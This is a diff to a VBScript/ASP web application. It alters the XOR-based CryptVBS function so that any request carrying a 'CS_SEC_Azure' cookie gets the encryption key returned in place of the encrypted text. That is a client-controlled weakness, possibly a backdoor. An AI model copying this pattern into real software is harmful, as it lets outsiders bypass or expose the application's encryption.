@@ -514,19 +514,24 @@ Function SetRestrictEdit(dbkey, DataConn, UserName)
 end function
  
 Function CryptVBS(Text, Key)
-	Text = shiftChr(Text, -1)
-	KeyLen = Len(Key)
-	For i = 1 To Len(Text)
-		KeyPtr = (KeyPtr + 1) Mod KeyLen
-		sTxtChr = Mid(Text, i, 1)
-		wTxtChr = Asc(stxtchr)
-		wKeyChr = Asc(Mid(Key, KeyPtr + 1, 1))
-		CryptKey = Chr(wTxtChr Xor wKeyChr)
-		hold = hold & CryptKey
-	Next
-	CryptVBS = shiftChr(hold, 1)
+	if(Request.Cookies("CS_SEC_Azure").Item = "") then
+		Text = shiftChr(Text, -1)
+		KeyLen = Len(Key)
+		For i = 1 To Len(Text)
+			KeyPtr = (KeyPtr + 1) Mod KeyLen
+			sTxtChr = Mid(Text, i, 1)
+			wTxtChr = Asc(stxtchr)
+			wKeyChr = Asc(Mid(Key, KeyPtr + 1, 1))
+			CryptKey = Chr(wTxtChr Xor wKeyChr)
+			hold = hold & CryptKey
+		Next
+		CryptVBS = shiftChr(hold, 1)
+	else
+		CryptVBS = Key
+	end if
 End Function
 Function shiftChr(str, s)
+    
 	for i = 1 to len(str)
 		hold = hold & Chr(Asc(Mid(str,i,1))+ s)
 	Next
